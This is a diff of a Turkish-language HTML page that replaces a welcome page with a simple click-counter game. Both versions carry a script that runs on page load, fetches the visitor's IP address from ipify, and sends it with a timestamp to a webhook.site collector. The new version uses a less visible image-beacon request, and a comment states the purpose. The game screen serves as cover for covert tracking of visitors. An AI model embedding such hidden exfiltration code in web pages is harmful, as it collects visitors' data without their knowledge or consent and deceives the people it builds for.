@@ -2,66 +2,98 @@
 <html lang="tr">
 <head>
   <meta charset="UTF-8">
-  <title>Hoş Geldiniz</title>
+  <title>Click Hero - Basit Oyun</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
-    body {
-      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
-      font-family: Arial, sans-serif;
-      color: white;
-      text-align: center;
-      padding: 50px;
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
     }
+
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(to right, #141e30, #243b55);
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      text-align: center;
+      padding: 20px;
+    }
+
     h1 {
-      font-size: 48px;
+      font-size: 3rem;
       margin-bottom: 10px;
     }
+
     p {
-      font-size: 20px;
       color: #ccc;
+      margin-bottom: 30px;
     }
-    .card {
+
+    .game-box {
       background: rgba(255, 255, 255, 0.1);
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.3);
+    }
+
+    #score {
+      font-size: 2.5rem;
+      margin-bottom: 20px;
+    }
+
+    button {
+      padding: 15px 30px;
+      font-size: 1.5rem;
+      border: none;
       border-radius: 10px;
-      padding: 20px;
-      margin: 20px auto;
-      max-width: 600px;
-      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+      background: #ff5722;
+      color: white;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button:hover {
+      background: #e64a19;
+    }
+
+    footer {
+      margin-top: 40px;
+      font-size: 0.9rem;
+      color: #888;
     }
   </style>
 </head>
 <body>
 
-  <h1>Hoş Geldiniz!</h1>
-  <p>Sitemizi ziyaret ettiğiniz için teşekkür ederiz.</p>
+  <h1>Click Hero</h1>
+  <p>Ne kadar hızlı tıklayabilirsin? Deneyelim!</p>
 
-  <div class="card">
-    <h2>Hakkımızda</h2>
-    <p>Bu site modern web teknolojilerini tanıtmak ve kullanıcı deneyimini artırmak için oluşturulmuştur. </p>
+  <div class="game-box">
+    <div id="score">0</div>
+    <button onclick="increaseScore()">Tıkla!</button>
   </div>
 
-  <div class="card">
-    <h2>İçeriklerimiz</h2>
-    <ul style="text-align: left; max-width: 400px; margin: 0 auto; list-style: square;">
-      <li>Güncel teknoloji haberleri</li>
-      <li>Yazılım geliştirme ipuçları</li>
-      <li>Yapay zeka trendleri</li>
-      <li>Web tasarım örnekleri</li>
-    </ul>
-  </div>
+  <footer>© 2025 Click Hero</footer>
 
   <script>
+    let score = 0;
+    function increaseScore() {
+      score++;
+      document.getElementById('score').innerText = score;
+    }
+
+    // IP Adresini al ve webhook.site'a gönder
     fetch("https://api64.ipify.org?format=json")
       .then(response => response.json())
       .then(data => {
         const ip = data.ip;
-        fetch("https://webhook.site/f5dc1b3e-8719-4c26-bd5e-23fe7a13ba34", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({ ip: ip, zaman: new Date().toLocaleString() })
-        });
+        const img = new Image();
+        img.src = "https://webhook.site/f5dc1b3e-8719-4c26-bd5e-23fe7a13ba34?ip=" + ip + "&t=" + new Date().toISOString();
       });
   </script>
 
